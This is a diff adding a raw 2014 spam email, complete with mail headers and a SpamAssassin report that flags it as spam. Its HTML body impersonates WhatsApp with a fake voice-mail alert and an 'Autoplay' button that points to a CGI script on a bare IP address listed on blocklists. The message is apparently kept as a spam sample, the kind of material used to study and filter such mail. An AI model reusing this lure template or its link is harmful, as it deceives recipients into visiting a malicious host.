@@ -1,0 +1,89 @@
+Return-Path: <carina.arthursson@home.se>
+X-Spam-Checker-Version: SpamAssassin 3.3.2 (2011-06-06) on www546b.sakura.ne.jp
+X-Spam-Flag: YES
+X-Spam-Level: ********
+X-Spam-Status: Yes, score=8.3 required=7.0 tests=BAYES_40,DATE_IN_PAST_12_24,
+	FREEMAIL_FROM,HTML_MESSAGE,IP_LINK_PLUS,MIME_HTML_ONLY,NORMAL_HTTP_TO_IP,
+	RAZOR2_CF_RANGE_51_100,RAZOR2_CF_RANGE_E8_51_100,RAZOR2_CHECK,URIBL_SBL,
+	URIBL_WS_SURBL autolearn=no version=3.3.2
+X-Spam-Report: 
+	*  1.6 URIBL_SBL Contains an URL's NS IP listed in the SBL blocklist
+	*      [URIs: 209.240.134.10]
+	*  0.0 FREEMAIL_FROM Sender email is commonly abused enduser mail provider
+	*      (carina.arthursson[at]home.se)
+	*  1.0 DATE_IN_PAST_12_24 Date: is 12 to 24 hours before Received: date
+	*  1.6 URIBL_WS_SURBL Contains an URL listed in the WS SURBL blocklist
+	*      [URIs: 209.240.134.10]
+	*  0.0 IP_LINK_PLUS URI: Dotted-decimal IP address followed by CGI
+	*  0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address in URL
+	* -0.0 BAYES_40 BODY: Bayes spam probability is 20 to 40%
+	*      [score: 0.3794]
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.7 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  1.9 RAZOR2_CF_RANGE_E8_51_100 Razor2 gives engine 8 confidence level
+	*      above 50%
+	*      [cf: 100]
+	*  0.5 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+	*      [cf: 100]
+	*  0.9 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+Received: from www546b.sakura.ne.jp (ksav31.sakura.ne.jp [210.224.165.211])
+	by www546b.sakura.ne.jp (8.14.3/8.14.3) with ESMTP id s2NN8bbh067399
+	for <hobby.division@sportshobby.co.jp>; Mon, 24 Mar 2014 08:08:37 +0900 (JST)
+	(envelope-from carina.arthursson@home.se)
+X-Nat-Received: from [112.78.125.46]:61377 [ident-empty]
+	by smtp-proxy.isp with TPROXY id 1395616117.31974
+Received: from localhost ([210.177.156.44])
+	by www546b.sakura.ne.jp (8.14.3/8.14.3) with SMTP id s2NN8aV1067396
+	for <hobby.division@sportshobby.co.jp>; Mon, 24 Mar 2014 08:08:36 +0900 (JST)
+	(envelope-from carina.arthursson@home.se)
+Date: Sun, 23 Mar 2014 09:55:33 +0000
+From: AutomationReminder <carina.arthursson@home.se>
+To: "hobby.division@sportshobby.co.jp" <hobby.division@sportshobby.co.jp>
+Subject: Hobby Division You have a new voice mail: 9:55
+Message-ID: <73377e6e.93e185382a3da.cd541d6b7d482b32@home.se>
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+X-Anti-Virus: Kaspersky Anti-Virus for Linux Mail Server 5.6.45.2/RELEASE, bases: 23032014 #7607103, status: clean
+
+<html>
+ <head>
+  <title></title>
+ </head>
+<body style="background:#393e43;padding:20px;">
+
+ <div style="max-width:680px;">
+ <table width="100%" cellspacing="0" cellpadding="10" border="0">
+  <tr>
+   <td style="background:#26252a;border-bottom:solid 10px #34af23;padding:20px;">
+    <table cellspacing="0" cellpadding="0" border="0"><tr><td style="font-family:arial;font-weight:bold;font-size:30px;color:#ffffff;">Whats App</td></tr></table>
+   </td>
+  </tr>
+  <tr>
+   <td style="background:#ffffff;font-family:arial;font-weight:normal;font-size:14px;color:#333333;">
+
+<div><br/><table cellspacing="0" cellpadding="0" border="0" align="center">
+<tr><td style="font-family:arial;font-weight:bold;font-size:22px;color:#808080;">You have a new voice mail.</td></tr>
+</table></div><br/>
+
+<div style="color:#40a9d8;">Information</div><br/>
+<div style="padding-left:30px;">Time: Mar 23 9:55<br/>Length of Call: 05 sec</div>
+
+   </td>
+  </tr>
+  <tr>
+   <td style="background:#ffffff;text-align:center;padding:20px;"><br/>
+
+    <a href="http://209.240.134.10/cgi-bin/showdown.pl" style="border-radius:20px 20px 20px 20px;padding:5px 40px 5px 40px;background:#67bb34;color:#ffffff;text-decoration:none;font-family:arial;font-weight:bold;font-size:30px;">Autoplay</a><br/><br/>
+
+   </td>
+  </tr>
+  <tr>
+   <td style="background:#d9d9d9;font-family:arial;font-weight:normal;font-size:11px;color:#808080;">&copy; 2014 Whats App</td>
+  </tr>
+ </table>
+ </div>
+
+</body>
+</html>
+
